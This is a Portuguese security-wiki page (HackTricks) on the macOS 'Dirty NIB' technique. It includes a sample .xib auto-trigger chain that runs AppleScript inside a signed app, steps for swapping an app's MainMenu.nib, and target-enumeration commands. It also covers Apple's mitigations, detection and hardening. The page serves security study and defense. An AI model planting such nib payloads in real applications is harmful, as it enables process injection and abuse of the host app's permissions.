# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB refere-se ao abuso de arquivos Interface Builder (.xib/.nib) dentro de um signed macOS app bundle para executar lógica controlada pelo atacante dentro do processo-alvo, herdando assim suas entitlements e permissões TCC. Essa técnica foi documentada originalmente por xpn (MDSec) e posteriormente generalizada e significativamente ampliada pela Sector7, que também abordou as mitigações da Apple no macOS 13 Ventura e no macOS 14 Sonoma.<sup>[1][2]</sup> Para obter contexto e análises aprofundadas, consulte as referências no final.

> TL;DR
> • Antes do macOS 13 Ventura: substituir o MainMenu.nib de um bundle (ou outro nib carregado na inicialização) podia obter process injection de forma confiável e frequentemente privilege escalation.
> • Desde o macOS 13 (Ventura), com melhorias no macOS 14 (Sonoma): a verificação profunda no primeiro lançamento, a proteção do bundle, as Launch Constraints e a nova permissão TCC “App Management” impedem em grande parte a adulteração de nib após o lançamento por aplicativos não relacionados. Os ataques ainda podem ser viáveis em casos específicos (por exemplo, ferramentas do mesmo desenvolvedor modificando seus próprios aplicativos ou terminais aos quais o usuário concedeu App Management/Full Disk Access).


## O que são arquivos NIB/XIB

Arquivos Nib (abreviação de NeXT Interface Builder) são grafos de objetos de UI serializados usados por aplicativos AppKit. O Xcode moderno armazena arquivos XML .xib editáveis, que são compilados em .nib durante o build. Um aplicativo típico carrega sua UI principal por meio de `NSApplicationMain()`, que lê a chave `NSMainNibFile` do Info.plist do aplicativo e instancia o grafo de objetos em runtime.

Pontos importantes que possibilitam o ataque:
- O carregamento de NIB instancia classes Objective-C arbitrárias sem exigir que elas estejam em conformidade com NSSecureCoding (o carregador de nib da Apple recorre a `init`/`initWithFrame:` quando `initWithCoder:` não está disponível).
- Cocoa Bindings podem ser abusados para chamar métodos enquanto os nibs são instanciados, incluindo chamadas encadeadas que não exigem interação do usuário.


## Processo de injeção Dirty NIB (visão do atacante)

O fluxo clássico anterior ao Ventura:
1) Criar um .xib malicioso
- Adicionar um objeto `NSAppleScript` (ou outras classes “gadget”, como `NSTask`).
- Adicionar um `NSTextField` cujo título contenha o payload (por exemplo, AppleScript ou argumentos de comando).
- Adicionar um ou mais objetos `NSMenuItem` conectados por bindings para chamar métodos no objeto-alvo.

2) Acionar automaticamente sem cliques do usuário
- Usar bindings para definir o target/selector de um item de menu e, em seguida, invocar o método privado `_corePerformAction` para que a ação seja disparada automaticamente quando o nib for carregado. Isso elimina a necessidade de o usuário clicar em um botão.

Exemplo mínimo de uma cadeia de auto-trigger dentro de um .xib (resumido para maior clareza):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Isso permite a execução arbitrária de AppleScript no processo-alvo durante o carregamento do nib.<sup>[1]</sup> Advanced chains podem:
- Instanciar classes arbitrárias do AppKit (por exemplo, `NSTask`) e chamar métodos sem argumentos como `-launch`.
- Chamar selectors arbitrários com argumentos de objeto usando o binding trick acima.
- Carregar o AppleScriptObjC.framework para fazer a ponte com Objective-C e até chamar APIs C selecionadas.
- Em sistemas mais antigos que ainda incluem Python.framework, fazer a ponte com Python e então usar `ctypes` para chamar funções C arbitrárias (pesquisa da Sector7).<sup>[2]</sup>

3) Substituir o nib do app
- Copie target.app para um local com permissão de escrita, substitua, por exemplo, `Contents/Resources/MainMenu.nib` pelo nib malicioso e execute target.app. Antes do Ventura, após uma avaliação única do Gatekeeper, os lançamentos subsequentes realizavam apenas verificações superficiais de assinatura, portanto recursos não executáveis (como `.nib`) não eram validados novamente.

Exemplo de payload AppleScript para um teste visível:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Proteções modernas do macOS (Ventura/Monterey/Sonoma/Sequoia)

A Apple introduziu várias mitigações sistêmicas que reduzem drasticamente a viabilidade do Dirty NIB no macOS moderno:<sup>[2]</sup>
- Verificação profunda no primeiro lançamento e proteção de bundles (macOS 13 Ventura)
- Na primeira execução de qualquer app (em quarentena ou não), uma verificação profunda da assinatura abrange todos os recursos do bundle. Depois disso, o bundle fica protegido: somente apps do mesmo desenvolvedor (ou explicitamente autorizados pelo app) podem modificar seu conteúdo. Outros apps precisam da nova permissão TCC “App Management” para gravar no bundle de outro app.
- Launch Constraints (macOS 13 Ventura)
- Apps do sistema/fornecidos pela Apple não podem ser copiados para outro local e executados; isso elimina a abordagem de “copiar para /tmp, modificar e executar” para apps do sistema operacional.
- Melhorias no macOS 14 Sonoma
- A Apple reforçou o App Management e corrigiu bypasses conhecidos (por exemplo, CVE‑2023‑40450) mencionados pela Sector7. Python.framework foi removido anteriormente (macOS 12.3), quebrando algumas cadeias de privilege-escalation.
- Alterações no Gatekeeper/Quarantine
- Para uma discussão mais ampla sobre Gatekeeper, proveniência e alterações de avaliação que impactaram essa técnica, consulte a página referenciada abaixo.

> Implicação prática
> • No Ventura+ geralmente não é possível modificar o .nib de um app de terceiros, a menos que seu processo tenha App Management ou seja assinado com o mesmo Team ID do alvo (por exemplo, developer tooling).
> • Conceder App Management ou Full Disk Access a shells/terminais efetivamente reabre essa superfície de ataque para qualquer coisa capaz de executar código no contexto desse terminal.


### Abordando Launch Constraints

Launch Constraints impedem a execução de muitos apps da Apple a partir de locais que não sejam os padrão desde o Ventura. Se você dependia de workflows anteriores ao Ventura, como copiar um app da Apple para um diretório temporário, modificar `MainMenu.nib` e executá-lo, espere que isso falhe em >= 13.0.


## Enumerando alvos e nibs (útil para pesquisa / sistemas legados)

- Localize apps cuja UI é controlada por nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Encontre recursos nib candidatos dentro de um bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Valide profundamente as assinaturas de código (falhará se você tiver adulterado os recursos e não os tiver assinado novamente):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Nota: No macOS moderno, você também será bloqueado pela proteção de bundles/TCC ao tentar gravar no bundle de outro app sem a autorização adequada.


## Dicas de detecção e DFIR

- Monitoramento da integridade dos arquivos nos recursos do bundle
- Monitore alterações de mtime/ctime em `Contents/Resources/*.nib` e em outros recursos não executáveis dos apps instalados.
- Unified logs e comportamento dos processos
- Monitore a execução inesperada de AppleScript dentro de apps GUI e por processos que carreguem AppleScriptObjC ou Python.framework. Exemplo:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Avaliações proativas
- Execute periodicamente `codesign --verify --deep` em apps críticos para garantir que os recursos permaneçam intactos.
- Contexto de privilégios
- Audite quem/o que possui TCC “App Management” ou Full Disk Access (especialmente terminais e agentes de gerenciamento). Remover essas permissões de shells de uso geral impede a reativação trivial de adulterações no estilo Dirty NIB.


## Hardening defensivo (desenvolvedores e defensores)

- Prefira UI programática ou limite o que é instanciado a partir de nibs. Evite incluir classes poderosas (por exemplo, `NSTask`) em grafos de nibs e evite bindings que invoquem indiretamente selectors em objetos arbitrários.
- Adote o hardened runtime com Library Validation (já padrão em apps modernos). Embora isso não impeça a injeção de nib por si só, bloqueia o carregamento fácil de código nativo e força os atacantes a usar payloads somente de scripting.
- Não solicite nem dependa de permissões amplas de App Management em ferramentas de uso geral. Se o MDM exigir App Management, segregue esse contexto de shells controlados pelo usuário.
- Verifique regularmente a integridade do bundle do seu app e faça com que seus mecanismos de atualização corrijam automaticamente os recursos do bundle.


## Leitura relacionada no HackTricks

Saiba mais sobre Gatekeeper, quarantine e alterações de proveniência que afetam esta técnica:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Referências

- [1] [xpn – DirtyNIB (write-up original com exemplo usando o Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Trazendo a injeção de processos para a view: explorando todos os apps macOS usando arquivos nib (5 de abril de 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
